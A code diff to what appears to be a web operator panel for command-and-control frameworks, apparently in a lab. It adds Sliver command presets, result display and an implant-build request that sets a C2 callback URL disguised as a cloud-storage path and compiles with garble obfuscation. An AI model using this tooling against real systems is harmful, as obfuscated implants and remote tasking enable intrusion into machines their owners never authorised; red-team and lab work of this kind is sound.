@@ -422,7 +422,11 @@ const OPS_PRESETS = {
   adaptix:  ['getuid', 'ls C:\\Users\\vagrant', 'ps list',
              'shell whoami', 'powershell whoami /priv',
              'shell whoami > C:\\Users\\vagrant\\out.txt'],
-  sliver:   ['whoami', 'Get-Process', 'whoami /priv'],
+  // Sliver `execute` runs the binary directly with no shell: no `>`, `|`,
+  // `&&`. `whoami /priv` passes /priv as an argument (harmless); shell
+  // features need an explicit wrapper, hence the cmd.exe preset.
+  sliver:   ['whoami', 'hostname', 'ipconfig',
+             'cmd.exe "/c whoami > C:\\Users\\vagrant\\out.txt"'],
 };
 
 let opsSessions = [];
@@ -612,6 +616,10 @@ function opsShowResult(backend, data) {
   } else if (backend === 'meridian') {
     text = typeof data.result === 'string' ? data.result : JSON.stringify(data.result, null, 2);
     meta.textContent = 'queued (read output from the meridian results table)';
+  } else if (backend === 'sliver') {
+    const r = data.result || {};
+    text = r.output || (r.ok === false ? (r.raw || 'task failed') : '(no output returned)');
+    meta.textContent = 'session ' + (r.session_id || '');
   } else {
     text = JSON.stringify(data, null, 2);
   }
@@ -640,6 +648,11 @@ async function opsRunBuild() {
       url = '/api/ops/adaptix/agent';
       body = { agent: 'beacon', listener: 'cadre_http', arch: arch,
                format: fmt, sleep: sleep, jitter: 0 };
+    } else if (fw === 'sliver') {
+      url = '/api/ops/sliver/generate';
+      body = { kind: 'session', c2_url: '192.168.77.1:80/cloud/storage/objects',
+               target_os: 'windows', arch: 'amd64' };
+      out.textContent = 'Sliver compiles with garble (~40s warm, minutes cold).\n\nbuilding…';
     } else {
       url = '/api/ops/havoc/build';
       body = { arch: arch, format: 'Windows Exe' };
@@ -656,6 +669,14 @@ async function opsRunBuild() {
       return;
     }
     out.className = 'ops-output build-out';
+    if (fw === 'sliver') {
+      // 48 MB binaries stay server-side; the operator fetches with docker cp.
+      out.textContent = 'Sliver ' + (data.kind || '') + ' implant built.\n' +
+        'Container path: ' + (data.container_path || '') + '\n' +
+        'Retrieve with: ' + (data.retrieve || '') + '\n\n' +
+        (data.log || '');
+      return;
+    }
     const b64 = data.base64 || '';
     const head = (data.filename || 'payload') + ' — ' + (data.size || 0) + ' bytes\n';
     const link = b64
